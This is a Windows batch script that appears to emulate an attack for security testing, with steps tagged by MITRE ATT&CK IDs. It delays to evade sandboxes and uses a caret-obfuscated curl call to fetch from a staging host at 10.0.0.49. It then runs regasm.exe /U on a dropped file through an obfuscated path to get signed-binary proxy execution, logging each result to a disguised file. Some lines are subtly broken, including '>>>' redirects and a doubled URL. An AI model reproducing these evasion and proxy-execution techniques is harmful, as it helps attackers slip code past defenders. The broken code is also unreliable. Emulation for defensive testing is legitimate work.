@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values (plain literals)
SET txisnba=%APPDATA%\7849\5c956340
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7849-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=project.txt
SET dvhhyc=7849
SET vqabzrc=%APPDATA%\!rrocubc!\macula-simulations.log

REM Build heartbeat URL without modifying PHR_ value
SET hxklrzt=!mdvfmsbx!/!keghkgto!

REM Initial sandbox evasion delay (30-60 seconds)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_start=30000ms>>> "!vqabzrc!" 2>nul
ping -n 31 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete>>> "!vqabzrc!" 2>nul

REM Operation 1: Heartbeat check (T1105)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check_start=!hxklrzt!>>> "!vqabzrc!" 2>nul

REM Obfuscated curl command with caret escapes
SET nkupdaz=c^u^r^l
SET qodzbrx=-^k
SET xkdukws=-^s
SET jikqda=-^o
SET vnkwjzn=n^u^l
SET ypjkxq="

!nkupdaz! !qodzbrx! !xkdukws! !jikqda! !vnkwjzn! !ypjkxq!!hxklrzt!!ypjkxq!

REM Log TTP result for heartbeat
SET nqaywzr=1
SET bwoyevd=
IF ERRORLEVEL 1 (
    SET nqaywzr=0
    SET bwoyevd=connection_failed
)

SET hgcqvps=!DATE:~6,4!-!DATE:~0,2!-!DATE:~3,2!
SET wgymzla=!TIME:~0,8!.000
echo [!hgcqvps! !wgymzla!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1105|Ingress Tool Transfer=!nqaywzr!:!bwoyevd!>> "!vqabzrc!" 2>nul || echo >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check_complete=result_!nqaywzr!>>> "!vqabzrc!" 2>nul

REM Random delay between operations
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_start>>> "!vqabzrc!" 2>nul
SET /A znxllcp=%RANDOM% %% 15 + 5
timeout /t !znxllcp! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_complete=!znxllcp!s>>> "!vqabzrc!" 2>nul

REM Operation 2: Change directory
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!txisnba!>>> "!vqabzrc!" 2>nul
cd /d "!txisnba!"
IF ERRORLEVEL 1 (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_failed=access_denied>>> "!vqabzrc!" 2>nul
    SET zscqmgq=0
    SET mvvabrt=directory_not_found
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_complete>>> "!vqabzrc!" 2>nul
)

REM Medium delay before LOLBIN execution
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: pre_execution_delay_start>>> "!vqabzrc!" 2>nul
CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: pre_execution_delay_complete>>> "!vqabzrc!" 2>nul

REM Operation 3: Execute regasm.exe with obfuscated command (T1218)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_execution_start=!xzanpex!>>> "!vqabzrc!" 2>nul

REM Heavily obfuscated regasm.exe path with caret escapes
SET jtmvyj=C^:\W^i^n^d^o^w^s^\
SET uzgxfk=M^i^c^r^o^s^o^f^t^.^N^E^T^\
SET zmgzah=F^r^a^m^e^w^o^r^k^\
SET agtgcw=v^4^.^0^.^3^0^3^1^9^\
SET mgmkfv=r^e^g^a^s^m^.^e^x^e

SET regasm_cmd=!jtmvyj!!uzgxfk!!zmgzah!!agtgcw!!mgmkfv!

REM Obfuscated arguments with caret escapes
SET /U_arg=/^U
SET file_arg="!xzanpex!"

CALL !regasm_cmd! !/U_arg! !file_arg!

REM Log TTP result for regasm execution
SET bfoaynd=1
SET hvvgznq=
IF ERRORLEVEL 1 (
    SET bfoaynd=0
    SET hvvgznq=assembly_load_failed
)

SET dlhpgts=!DATE:~6,4!-!DATE:~0,2!-!DATE:~3,2!
SET bnauqqd=!TIME:~0,8!.000
echo [!dlhpgts! !bnauqqd!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!bfoaynd!:!hvvgznq!>> "!vqabzrc!" 2>nul || echo >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_execution_complete=result_!bfoaynd!>>> "!vqabzrc!" 2>nul

REM Final cleanup delay
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_start>>> "!vqabzrc!" 2>nul
timeout /t 15 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_complete>>> "!vqabzrc!" 2>nul

ENDLOCAL
exit /b 0